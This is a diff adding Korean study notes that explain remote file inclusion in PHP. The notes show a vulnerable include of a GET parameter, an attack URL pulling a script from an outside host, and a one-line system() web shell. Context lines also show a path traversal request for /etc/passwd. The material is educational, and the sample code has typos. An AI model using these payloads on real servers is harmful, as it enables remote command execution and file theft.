@@ -202,3 +202,25 @@ http://example.com/read.php?log=../../etc/passwd
 - 만약 read.php가 디렉토리를 지정 받을 수 있다면 공개를 원치 않는 파일에 액세스할 수 있다.
 
 ### 11.2.7 리모트 파일 인클루션
+- 리모트 파일 인클루션 : 스크립트의 일부를 다른 파일에서 읽어올 때 공격자가 지정한 외부 서버의 URL을 파일에서 읽게 함으로써 임의의 스크립트를 동작시키는 공격
+- 주로 PHP에서 발생하는 취약성으로, PHP의 include와 require 설정에 따라서 외부 서버의 URL을 파일명으로 지정할 수 있는 기능
+- 위험한 기능 때문에 PHP5.2.0 이후에서는 초기에 무효로 설정되어 있음.
+
+#### 리모트 파일 인클루션의 공격 사례
+- include로 스크립트에 다른 파일을 읽어들이는 기능
+```
+http://example.com/foo.pho?mod=news.php
+```
+- 이 스크립트의 소스 코드는 아래와 같이 되어 있다.
+```shell
+$modname = $_GET['mod'];
+Include($modename);
+```
+- 공격자는 아래와 같은 URL을 쿼리에 지정한 리퀘스트를 보낸다.
+```
+http://example.com/foo.pho?mod=http://hackr.jp/cmd.php&cmd=ls
+```
+- 공격자는 외부 서버에 아래 스크립트를 준비해둔다.
+```
+<? System($_GET['cmd']) ?>
+```
